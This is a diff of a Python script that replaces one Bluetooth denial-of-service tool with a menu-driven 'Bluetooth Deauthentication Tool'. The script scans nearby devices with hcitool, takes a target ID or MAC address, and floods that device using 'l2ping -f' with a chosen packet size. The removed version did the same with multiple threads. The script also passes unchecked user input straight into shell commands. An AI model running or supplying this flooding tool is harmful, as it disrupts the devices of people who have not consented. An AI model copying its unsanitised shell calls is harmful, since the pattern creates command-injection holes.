@@ -1,81 +1,102 @@
 import os
-import threading
 import time
 import subprocess
-def DOS(target_addr, packages_size):
-    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
 
-def printLogo():
-    print('                            Bluetooth DOS Script                            ')
-def main():
-    printLogo()
+def get_bluetooth_interface():
+    os.system('clear')
+    logo()
+    print("")
+    interfaces = subprocess.check_output("hciconfig | grep -E 'hci[0-9]+:|Bus|UP RUNNING|DOWN'", shell=True, text=True)
+    print("Available Bluetooth Interfaces:")
+    print("")
+    print(interfaces)
+    interface = input("Enter the Bluetooth interface (e.g., hci0): ")
+    return interface
+
+def scan_attack():
+    logo()
+    while True:
+        menu()
+        choice = input("|-->Enter your choice (1 or 2) > ")
+        if choice == '1':
+            bluetooth_interface = get_bluetooth_interface()
+            break
+        elif choice == '2':
+            print("Exiting...")
+            exit(0)
+        else:
+            print("Invalid choice! Please enter 1 or 2.")
+
     time.sleep(0.1)
-    print('')
-    print('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
-    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
-        time.sleep(0.1)
-        os.system('clear')
-        printLogo()
-        print('')
-        print("Scanning ...")
-        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
-        lines = output.splitlines()
-        id = 0
-        del lines[0]
-        array = []
-        print("|id   |   mac_addres  |   device_name|")
-        for line in lines:
-            info = line.split()
-            mac = info[0]
-            array.append(mac)
-            print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
-            id = id + 1
-        target_id = input('Target id or mac > ')
-        try:
-            target_addr = array[int(target_id)]
-        except:
-            target_addr = target_id
+    os.system('clear')
+    logo()
+    print("")
+    print("Scanning...")
+    print("")
+    bluetooth_scan = subprocess.check_output(f"hcitool -i {bluetooth_interface} scan", shell=True, stderr=subprocess.STDOUT, text=True)
+    lines = bluetooth_scan.splitlines()
+    id = 1
+    del lines[0]
+    array = []
+    print("ID   MAC Address           Device Name       ")
+    print("")
+    for line in lines:
+        info = line.split()
+        device_mac = info[0]
+        device_name = ' '.join(info[1:])
+        array.append(device_mac)
+        print("{}    {}     {}          ".format(id, device_mac, device_name))
+        id += 1
+        print("")
+    target_id = input('Target ID or MAC Address > ')
+    try:
+        target_address = array[int(target_id) - 1]
+    except IndexError:
+        target_address = target_id
 
-
-        if len(target_addr) < 1:
-            print('[!] ERROR: Target addr is missing')
-            exit(0)
-
-        try:
-            packages_size = int(input('Packages size > '))
-        except:
-            print('[!] ERROR: Packages size must be an integer')
-            exit(0)
-        try:
-            threads_count = int(input('Threads count > '))
-        except:
-            print('[!] ERROR: Threads count must be an integer')
-            exit(0)
-        print('')
-        os.system('clear')
-
-        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
-
-        for i in range(0, 3):
-            print('[*] ' + str(3 - i))
-            time.sleep(1)
-        os.system('clear')
-        print('[*] Building threads...\n')
-
-        for i in range(0, threads_count):
-            print('[*] Built thread №' + str(i + 1))
-            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
-
-        print('[*] Built all threads...')
-        print('[*] Starting...')
-    else:
-        print('Bip bip')
+    if len(target_address) < 1:
+        print('[!] Target address is missing!')
         exit(0)
+    try:
+        packet_size = int(input('Packet Size (Max : 600) > '))
+    except ValueError:
+        print('[!] Packet size must be an integer!')
+        exit(0)
+    print("")
+    os.system('clear')
+
+    for i in range(0, 3):
+        countdown_message = f"[*] Starting deauthentication attack in {3 - i} seconds..."
+        print(countdown_message, end='\r')
+        time.sleep(1)
+    os.system('clear')
+    print("[*] Attack Started!")
+    try:
+        os.system(f'l2ping -i {bluetooth_interface} -s {packet_size} -f {target_address}')
+    except KeyboardInterrupt:
+        print("\n[*] Attack Aborted!")
+
+def menu():
+    print('')
+    print("+------------------+")
+    print("|-Choose an option-|")
+    print("+------------------+")
+    print("|-->1. Scan and attack")
+    print("|-->2. Quit")
+
+def logo():
+    print("\t\t\t\t\t\t+-------------------------------+")
+    print("\t\t\t\t\t\t|-----╔╗ ╦  ╦ ╦╔═╗╦═╗╔=╗╔═╗-----|")
+    print("\t\t\t\t\t\t|-----╠╩╗║  ║ ║║╣ ║ ║║ ║╚═╗-----|")
+    print("\t\t\t\t\t\t|-----╚═╝╩═╝╚═╝╚═╝╩═╝╚═╝╚═╝-----|")
+    print("\t\t\t\t\t\t|Bluetooth Deauthentication Tool|")
+    print("\t\t\t\t\t\t+-------------------------------+")
+
 
 if __name__ == '__main__':
     try:
         os.system('clear')
-        main()
+        scan_attack()
     except KeyboardInterrupt:
         time.sleep(0.1)
         print('\n[*] Aborted')
